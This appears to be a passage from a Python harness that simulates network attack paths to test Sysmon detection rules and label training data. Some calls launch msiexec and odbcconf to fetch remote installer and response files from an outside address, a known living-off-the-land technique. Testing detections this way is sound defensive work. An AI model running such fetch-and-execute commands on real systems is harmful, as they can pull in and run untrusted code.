n = hits_since("NET_LOLBIN_NETWORK_001", path_start)
if n == 0:
    print("  [D-b] INCONCLUSIVE — msiexec internal WinINet path")
    result = "INCONCLUSIVE"
    reason = "D-b: process uses WinINet internally — EID-3 not generated"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path B: {result} ({n} hits)")
results.append({
    "rule_id": "NET_LOLBIN_NETWORK_001",
    "attack_path": "Path B",
    "field_values_used": "msiexec.exe;/i http://8.8.8.8/b.msi /qn;initiated=true",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path C — odbcconf.exe HTTP to 8.8.8.8:80 (D-b risk)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([r"C:\Windows\System32\odbcconf.exe", "/f", "http://8.8.8.8/a.rsp"],
            "NET_LOLBIN_NETWORK_001 Path C Launch 1")
launch_argv([r"C:\Windows\System32\odbcconf.exe", "/f", "http://8.8.8.8/a.rsp"],
            "NET_LOLBIN_NETWORK_001 Path C Launch 2")
n = hits_since("NET_LOLBIN_NETWORK_001", path_start)
if n == 0:
    print("  [D-b] INCONCLUSIVE — odbcconf /f HTTP likely uses WinINet")
    result = "INCONCLUSIVE"
    reason = "D-b: process uses WinINet internally — EID-3 not generated"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path C: {result} ({n} hits)")
results.append({
    "rule_id": "NET_LOLBIN_NETWORK_001",
    "attack_path": "Path C",
    "field_values_used": "odbcconf.exe;/f http://8.8.8.8/a.rsp;initiated=true",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# ---------------------------------------------------------------------------
# RULE 8: NET_SUSPICIOUS_PORT_001 — SKIP (D28)
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_SUSPICIOUS_PORT_001 — SKIP (D28)")
print("Reason: Sysmon EID-3 only captures ports 80/443 on this VM.")
print("        C2 ports (4444/1337/8888/etc.) are not observed.")
print("        Not a rule defect — environmental Sysmon config limitation.")
print("=" * 60)
for path in ["Path A", "Path B", "Path C"]:
    results.append({
        "rule_id": "NET_SUSPICIOUS_PORT_001",
        "attack_path": path,
        "field_values_used": "initiated=true;destination_port=4444/1337/8888",
        "result": "SKIP",
        "reason": "D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable",
        "timestamp_utc": datetime.datetime.utcnow().isoformat(),
    })

# ---------------------------------------------------------------------------
# RULE 9: NET_SMB_LATERAL_001 — SKIP (D28)
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_SMB_LATERAL_001 — SKIP (D28)")
print("Reason: Sysmon EID-3 only captures ports 80/443 on this VM.")
print("        SMB ports (445/139) are not observed.")
print("        Not a rule defect — environmental Sysmon config limitation.")
print("=" * 60)
for path in ["Path A", "Path B", "Path C"]:
    results.append({
        "rule_id": "NET_SMB_LATERAL_001",
        "attack_path": path,
        "field_values_used": "initiated=true;destination_port=445/139",
        "result": "SKIP",
        "reason": "D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable",
        "timestamp_utc": datetime.datetime.utcnow().isoformat(),
    })

# ---------------------------------------------------------------------------
# BLOCK 4 — Simulation window end
# ---------------------------------------------------------------------------
SIM_END = datetime.datetime.utcnow()
print(f"\nSimulation window end (UTC): {SIM_END.isoformat()}")

# ---------------------------------------------------------------------------
# BLOCK 5 — Summary table
# ---------------------------------------------------------------------------
RULE_ORDER = [
    "NET_POWERSHELL_HTTP_001",
    "NET_DNS_LONG_QUERY_001",
    "NET_DNS_SCRIPT_ENGINE_001",
    "NET_SCRIPTING_ENGINE_HTTP_001",
    "NET_SCRIPT_ENGINE_OUTBOUND_001",
    "NET_LOLBIN_PROCESS_HTTP_001",
    "NET_LOLBIN_NETWORK_001",
    "NET_SUSPICIOUS_PORT_001",
    "NET_SMB_LATERAL_001",
]

print("\nRULE                           | PATH_A      | PATH_B      | PATH_C      | OVERALL")
pass_count = 0
partial_count = 0
inconclusive_count = 0
skip_count = 0
fail_count = 0
fp_suppression_result = None

for rule_id in RULE_ORDER:
    path_a = path_b = path_c = "N/A"
    for row in results:
        if row["rule_id"] != rule_id:
            continue
        if row["attack_path"] == "Path A":
            path_a = row["result"]
        elif row["attack_path"] == "Path B":
            path_b = row["result"]
        elif row["attack_path"] == "Path C":
            path_c = row["result"]
        elif row["attack_path"] == "FP_SUPPRESSION":
            fp_suppression_result = row["result"]

    path_results = [path_a, path_b, path_c]
    if all(r == "PASS" for r in path_results):
        overall = "PASS"
        pass_count += 1
    elif any(r == "FAIL" for r in path_results):
        overall = "FAIL"
        fail_count += 1
    elif any(r == "INCONCLUSIVE" for r in path_results):
        overall = "INCONCLUSIVE"
        inconclusive_count += 1
    elif all(r == "SKIP" for r in path_results):
        overall = "SKIP"
        skip_count += 1
    elif any(r == "PARTIAL" for r in path_results):
        overall = "PARTIAL"
        partial_count += 1
    else:
        overall = "FAIL"
        fail_count += 1

    print(f"{rule_id:<30} | {path_a:<11} | {path_b:<11} | {path_c:<11} | {overall}")

print(f"\n{pass_count}/9 rules PASS, {partial_count} PARTIAL, {inconclusive_count} INCONCLUSIVE (D29/D-b), "
      f"{skip_count} SKIP (D28), {fail_count} FAIL")
if fp_suppression_result is not None:
    print(f"FP suppression (NET_POWERSHELL_HTTP_001): {fp_suppression_result}")

# ---------------------------------------------------------------------------
# BLOCK 6 — CSV export
# ---------------------------------------------------------------------------
csv_path = os.path.join(EXPORTS_DIR, "subphase_3_training.csv")
fieldnames = [
    "rule_id", "attack_path", "field_values_used",
    "result", "reason", "timestamp_utc",
]
with open(csv_path, "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=fieldnames)
    writer.writeheader()
    for row in results:
        writer.writerow(row)
print(f"\nStaging log written: {csv_path}")

# ---------------------------------------------------------------------------
# BLOCK 7 — Feature extraction instructions (print only, do not execute)
# ---------------------------------------------------------------------------
print("======================================================")
print("NEXT STEPS — run manually after reviewing output above")
print("======================================================")
print("")
print("STEP 1 — Query DB for confirmed UTC window of this subphase:")
print(f"  <python> -c \"")
print(f"  import sqlite3; conn = sqlite3.connect(r'{DB_PATH}');")
print("  row = conn.execute(\"SELECT MIN(timestamp), MAX(timestamp) FROM rule_hits")
print(f"    WHERE rule_id LIKE 'NET_%' AND timestamp >= '{SIM_START.strftime('%Y-%m-%d %H:%M:%S')}'\").fetchone();")
print("  print('Since:', row[0]); print('Until:', row[1]); conn.close()\"")
print("")
print("STEP 2 — Run feature extraction with DB-confirmed timestamps:")
print(f"  <python> {os.path.join(_REPO_ROOT, 'scripts', 'run_feature_extraction.py')}")
print("    --label 1")
print("    --since \"YYYY-MM-DD HH:MM:SS\"")
print("    --until \"YYYY-MM-DD HH:MM:SS\"")
print(f"    --output {os.path.join(_REPO_ROOT, 'data', 'features', 'suspicious_network.csv')}")
print("")
print("  Replace YYYY-MM-DD HH:MM:SS with MIN and MAX from STEP 1.")
print("  Do NOT use VM wall-clock time. All DB timestamps are UTC.")

# ---------------------------------------------------------------------------
# BLOCK 8 — Completion report
# ---------------------------------------------------------------------------
print("")
print("======================================================")
print("SUBPHASE 3 SIMULATION COMPLETE")
print("======================================================")
print("Total rules in network.yaml (live): 9")
print("Rules simulated: 7 (2 structural SKIP — D28)")
print("EID-3 rules: 7")
print("EID-22 rules: 2")
print("D29-risk rules: NET_DNS_SCRIPT_ENGINE_001, NET_SCRIPTING_ENGINE_HTTP_001,")
print("                NET_SCRIPT_ENGINE_OUTBOUND_001 (wscript/cscript paths)")
print("D28 structural SKIPs: NET_SUSPICIOUS_PORT_001, NET_SMB_LATERAL_001")
print(f"SIM_START (UTC): {SIM_START.isoformat()}")
print(f"SIM_END   (UTC): {SIM_END.isoformat()}")
print("CSV written to: exports/subphase_3_training.csv")
